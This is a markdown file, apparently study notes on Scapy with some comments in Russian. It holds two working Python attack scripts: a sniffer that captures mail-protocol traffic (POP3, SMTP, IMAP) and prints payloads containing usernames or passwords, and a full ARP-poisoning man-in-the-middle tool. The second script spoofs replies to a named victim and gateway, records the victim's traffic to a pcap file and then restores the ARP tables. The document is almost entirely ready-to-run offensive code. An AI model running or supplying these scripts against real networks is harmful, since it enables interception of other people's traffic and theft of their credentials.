# Scapy
## Example of the simple sniffer
```python
from scapy.all import sniff, TCP, IP

def packet_callback(packet):
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f'[*] Destination: {packet[IP].dst}')
            print(f'[*] {str(packet[TCP].payload)}')


def main():
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)


if __name__ == "__main__":
    main()
```
## Arper
```python
import threading
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap
from scapy.all import sendp
import os
import sys
import time
import logging

logging.basicConfig(level=logging.DEBUG)

#                     victim        gateway   iface
# ./Source/arper.py 192.168.1.65 192.168.1.254 en0


def get_mac(targetip, iface):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip)
    resp, _ = srp(packet, iface=iface, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.gateway = gateway
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        self.victimmac = get_mac(victim, interface)
        self.gatewaymac = get_mac(gateway, interface)

        print(f'[INFO] Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)

        self._stop = threading.Event()

    def run(self):
        self.poison_thread = threading.Thread(target=self.poison_loop, daemon=True)
        self.sniff_thread = threading.Thread(target=self.sniff, daemon=True)
        self.poison_thread.start()
        self.sniff_thread.start()
        try:
            while not self._stop.is_set():
                time.sleep(1)
        except KeyboardInterrupt:
            self._stop.set()
            self.restore()
            print("Stopped by user")

    def poison_loop(self, interval=2):
        if not self.victimmac or not self.gatewaymac:
            print("Missing MACs, aborting poison")
            return

        fake_mac = get_if_hwaddr(self.interface)  # можно задать любой MAC
        print(f'[INFO] fake mac address: {fake_mac}')
        print("Beginning the ARP poison. [CTRL-C to stop]")
        try:
            while not self._stop.is_set():
                # таргет жертве — говорим: шлюз = наш MAC (psrc=gateway)
                pkt_v = Ether(dst=self.victimmac)/ARP(op=2, psrc=self.gateway, pdst=self.victim, hwsrc=fake_mac, hwdst=self.victimmac)
                # таргет шлюзу — говорим: жертва = наш MAC (psrc=victim)
                pkt_g = Ether(dst=self.gatewaymac)/ARP(op=2, psrc=self.victim, pdst=self.gateway, hwsrc=fake_mac, hwdst=self.gatewaymac)

                print(f'[INFO] Sending package from (ip: {self.gateway}, mac: {fake_mac}) to (ip: {self.victim}, mac: {self.victimmac})')
                sendp(pkt_v, iface=self.interface, verbose=False)
                print(f'[INFO] Sending package from (ip: {self.victim}, mac: {fake_mac}) to (ip: {self.gateway}, mac: {self.gatewaymac})')
                sendp(pkt_g, iface=self.interface, verbose=False)
                time.sleep(interval)
        except Exception as e:
            print("Poison loop error:", e)
            self._stop.set()
            self.restore()

    def sniff(self, count=100):
        # ждём немного пока poison работает
        time.sleep(3)
        print(f"Sniffing {count} packets on {self.interface} (filter: ip host {self.victim})")
        bpf_filter = f'ip host {self.victim}'
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Saved arper.pcap')
        self._stop.set()
        self.restore()

    def restore(self):
        print('Restoring ARP tables...')
        # восстанавливаем реальные записи — отправляем корректные is-at от gateway->victim и victim->gateway
        sendp(Ether(dst=self.victimmac)/ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst=self.victimmac), iface=self.interface, count=5, verbose=False)
        sendp(Ether(dst=self.gatewaymac)/ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst=self.gatewaymac), iface=self.interface, count=5, verbose=False)


if __name__ == "__main__":
    # ./Source/arper.py 192.168.1.65 192.168.1.254 en0
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    logging.info(f'victim: {victim}, gateway: {gateway}, interface: {interface}')
    myarp = Arper(victim, gateway, interface)
    myarp.run()
```